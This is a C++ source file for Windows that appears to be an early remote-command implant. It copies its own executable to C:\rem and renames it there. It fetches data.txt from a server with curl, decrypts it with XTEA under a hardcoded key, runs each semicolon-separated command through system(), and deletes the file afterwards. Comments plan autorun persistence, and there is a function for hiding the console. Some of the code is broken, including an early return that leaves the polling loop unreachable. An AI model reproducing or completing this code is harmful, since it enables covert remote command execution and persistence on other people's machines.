#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <stdint.h>
#include <cstring>
#include <vector>
#include <stdio.h>
#include <functional>
using namespace std;
//xtea
bool exitoncommands=0;
#define BLOCK_SIZE 8
unsigned int key[4] = { 0xDEAD, 0xDEAD, 0xDEAD, 0xDEAD };
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) 
{
	unsigned int i;
	uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9;
	for (i = 0; i < num_rounds; i++) 
	{
		v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
		sum += delta;
		v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
	}
	v[0] = v0; v[1] = v1;
}
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
{
	unsigned int i;
	uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta * num_rounds;
	for (i = 0; i < num_rounds; i++)
	{
		v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
		sum -= delta;
		v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
	}
	v[0] = v0; v[1] = v1;
}
void xtea(char filePath[], bool boolEncrypt)
{
	fstream file(filePath, ios::in | ios::out | ios::binary);
	if (!file)
	{
        exitoncommands=0;
		return;
	}else{
        exitoncommands=1;
    }
    cout << "decrypt\n";
	file.seekg(0, ios::end);
	unsigned fileSize = file.tellg();
	file.seekg(ios::beg);
	file.clear();
	int blockNumber = fileSize / BLOCK_SIZE;
	if (fileSize % BLOCK_SIZE != 0) { ++blockNumber; }
	unsigned char dataArray[BLOCK_SIZE];
	unsigned filePosition = file.tellg();
	for (int i = 0; i < blockNumber; i++)
	{
		file.seekg(filePosition);
		file.read((char*)dataArray, BLOCK_SIZE);
		if (boolEncrypt) { encipher(64, (uint32_t*)dataArray, key); }    //encipher(32,
		else { decipher(64, (uint32_t*)dataArray, key); }                //decipher(32,
		file.seekp(filePosition);
		file.write((char*)dataArray, BLOCK_SIZE);
		memset(dataArray, 0, BLOCK_SIZE);
		filePosition += BLOCK_SIZE;
	}
	file.close();
}
//end of xtea

vector <string> commandlist;
void coutvect(){
    for(int i=0;i<commandlist.size();i++){
        cout << commandlist[i] << "\n";
    }
}

bool separate(){
    fstream dat;
    dat.open("data.txt");
    
    char ch;
    string tmp;
	string tmp2;
		while (getline(dat, tmp2, '\0')){
  			for(char ch : tmp2){
  	      		std::cout<< ch;
				if(ch==';'){
					commandlist.push_back(tmp);
					tmp.clear();	
				}
				tmp+=ch;
				
   	 		}
		}
        remove(".\\data.txt");
        coutvect();
    for(int i=0;i<commandlist.size();i++){
        system(commandlist[i].c_str());
    }
}

string parsefilename(string otp){
	string fname;
	char curr;
	for(int i=otp.size()-1;i > 0; i--){
		fname+=otp[i];
		curr=otp[i];
		if(curr=='\\' || curr=='/' || curr==':'){
			return fname;
		}
	}
return fname;
}

string getexepath()
{
  char result[ MAX_PATH ];
  return std::string( result, GetModuleFileName( NULL, result, MAX_PATH ) );
}

string strev(string str)
{
    int n = str.length();
    for (int i = 0; i < n / 2; i++)
        swap(str[i], str[n - i - 1]);
return str;
}

void hidecon()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}
int main(){
    //();
    bool ran=1;
    char dataxt[] = ".\\data.txt";
    //boot
	string tmp3;
	//check for location > if not rem, cp to rem and run rem version ( this probably escalates previleges & easy actualization)?
	string otp = getexepath();
	if(getexepath() != "C:\\rem\\main.exe"){
		system("powershell mkdir c:\\rem");
		string cm = "powershell cp '";
		cm+=otp;
		cm+="' c:\\rem";
		//cout << cm << "\n";
		system(cm.c_str());
		cm.clear();
		cm="powershell Rename-Item c:\\rem";
		string tmp4 = parsefilename(otp);
		cm+=strev(tmp4);
		cm+=" main.exe";
		cout << system(cm.c_str()) << "\n";
		sleep(600);
		cout << system("c:\\rem\\main.exe");
	}
	bool isc=0;
		cout << " " << otp << "\n";
		
		

		//wait for download of .ink
		//add downloaded .ink to autorun
		return 0;
	while(ran){
        system("curl http://localhost:8080/data.txt -o data.txt");
        xtea(dataxt,0);
        if(exitoncommands){
            separate();
            return 0;
        }
        Sleep(7000);
    }
}
